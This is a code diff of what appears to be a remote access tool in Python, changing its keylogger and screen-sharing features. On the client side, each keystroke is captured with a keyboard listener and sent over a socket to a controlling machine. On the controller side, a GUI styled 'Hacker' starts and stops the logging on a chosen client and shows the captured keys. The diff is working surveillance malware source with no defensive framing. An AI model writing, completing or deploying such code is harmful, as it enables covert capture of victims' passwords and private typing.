@@ -1084,15 +1084,15 @@ class ClientAPP:
             return False
 
     def start_keylogger(self):
-        try:
-            self.keylogger_active = True
-            self.key_buffer = []
-            self.last_send = time.time()
-            self.create_keylogger_thread()
-            return True
-        except Exception as e:
-            print(f"Keylogger start error: {e}")
-            return False
+            try:
+                self.keylogger_active = True
+                self.key_buffer = []
+                self.last_send = time.time()
+                self.create_keylogger_thread()
+                return True
+            except Exception as e:
+                print(f"Keylogger start error: {e}")
+                return False
 
     def stop_keylogger(self):
         try:
@@ -1104,35 +1104,31 @@ class ClientAPP:
             return False
 
     def create_keylogger_thread(self):
-        def on_press(key):
-            if not self.keylogger_active:
-                print(self.keylogger_active)
-                return False
-            print('Onprees Function is on')
-            try:
-                if hasattr(key, 'char'):
-                    key_str = key.char
-                elif hasattr(key, 'name'):
-                    key_str = f"[{key.name.upper()}]"
-                else:
-                    key_str = str(key)
+        if hasattr(self, 'listener') and self.listener.running:
+            print("Keylogger already running.")
+            return
 
-                try:
-                    self.socket.send(f"KEYLOG:{key_str}".encode())
-                    print(f'Key: {key_str} sent')
-                except Exception as e:
-                    print(f"Send error: {e}")
-                    
+        def on_press(key):
+            if not self.keylogger_active:            
+                print('letter')
+                return False
+            print('KeyLog letter')
+
+            try:
+                if hasattr(key, 'char') and key.char is not None:
+                    key_str = key.char
+                else:
+                    key_str = f"[{key.name.upper()}]"
+
+                self.socket.send(f"KEYLOG:{key_str}".encode())
+                print('KeyLog Sent letter')
             except Exception as e:
-                print(f"Key processing error: {e}")
+                print(f"Send error: {e}")
 
         def on_release(key):
             return self.keylogger_active
 
-        self.listener = Listener(
-            on_press=on_press,
-            on_release=on_release
-        )
+        self.listener = Listener(on_press=on_press, on_release=on_release)
         self.listener.start()
 
     def flush_key_buffer(self):
@@ -1145,8 +1141,8 @@ class ClientAPP:
             print(f"Buffer flush error: {e}")
 
 
+
     def screen_share(self):
-        print('Screen Sharing Started')
         while self.screen_share_toggle:
             try:
                 if self.screen_share_toggle:
@@ -2253,12 +2249,10 @@ if __name__ == "__main__":
     def receive_screen_updates(self, client_socket):
         try:
             while self.screen_viewer_active and self.screen_viewer:
-                # Receive frame size
                 size_data = client_socket.recv(struct.calcsize('L'))
                 if not size_data:
                     break
                 size = struct.unpack('L', size_data)[0]
-                # Receive frame data
                 frame_data = b""
                 remaining = size
 
@@ -2294,20 +2288,26 @@ if __name__ == "__main__":
             # self.log(f"Screen sharing error: {e}")
             self.stop_screen_share()
             self.log('Screen Sharing has been Terminated')
+            del chunk
             return
 
     def start_keylogger(self):
+        if "keylogger" in self.running_threads:
+            self.log("Keylogger is already running.")
+            return
+
         selected_client = self.get_selected_client()
         if selected_client:
             def keylogger_thread():
                 try:
                     self.log("Starting keylogger...")
                     selected_client.send(b"START_KEYLOGGER")
+                    
                     self.keylog_window = tk.Toplevel(self.root)
                     self.keylog_window.title("Keylogger")
                     self.keylog_window.geometry("600x400")
                     self.keylog_window.configure(bg=self.colors["bg_dark"])
-                    
+
                     self.keylog_text = tk.Text(
                         self.keylog_window,
                         bg=self.colors["bg_medium"],
@@ -2316,40 +2316,28 @@ if __name__ == "__main__":
                         wrap=tk.WORD
                     )
                     self.keylog_text.pack(fill="both", expand=True, padx=10, pady=10)
-                    
-                    save_btn = ttk.Button(
-                        self.keylog_window,
-                        text="[ SAVE LOG ]",
-                        command=self.save_keylog,
-                        style="Hacker.TButton"
-                    )
-                    save_btn.pack(pady=10)
+
                     while True:
                         try:
                             data = selected_client.recv(BUFFER_SIZE).decode()
-                            if 'STOP_LOGGER' in data or not data.startswith("KEYLOG:"):
-                                self.log('Keylogger Terminated')
+                            if not data or 'STOP_LOGGER' in data:
+                                self.log("Keylogger Terminated")
                                 break
-                            keystroke = data.replace("KEYLOG:", "")
-                            self.keylog_text.insert(tk.END, keystroke)
-                            self.keylog_text.see(tk.END)
+                            if data.startswith("KEYLOG:"):
+                                keystroke = data.replace("KEYLOG:", "")
+                                self.keylog_text.insert(tk.END, keystroke)
+                                self.keylog_text.see(tk.END)
+                                self.log(keystroke)
                         except Exception as e:
-                            continue
+                            self.log(f"Keylogger receive error: {e}")
+                            break
                 except Exception as e:
                     self.log(f"Keylogger error: {e}")
+                finally:
+                    del self.running_threads["keylogger"]
 
-            self.create_and_start_thread(keylogger_thread, f"keylogger_{random.randint(1000, 9999)}")
-
-    def save_keylog(self):
-        if hasattr(self, 'keylog_text'):
-            file_path = filedialog.asksaveasfilename(
-                defaultextension=".txt",
-                filetypes=[("Text files", "*.txt")]
-            )
-            if file_path:
-                with open(file_path, 'w') as f:
-                    f.write(self.keylog_text.get("1.0", tk.END))
-                self.log(f"Keylog saved to {file_path}")
+            self.running_threads["keylogger"] = threading.Thread(target=keylogger_thread)
+            self.running_threads["keylogger"].start()
 
     def stop_keylogger(self):
         selected_client = self.get_selected_client()
@@ -2357,7 +2345,9 @@ if __name__ == "__main__":
             try:
                 self.log("Stopping keylogger...")
                 selected_client.send(b"STOP_KEYLOGGER")
-                self.keylog_window.destroy()
+                if hasattr(self, 'keylog_window'):
+                    self.keylog_window.destroy()
+
                 if "keylogger" in self.running_threads:
                     self.running_threads["keylogger"].join(timeout=1.0)
                     del self.running_threads["keylogger"]
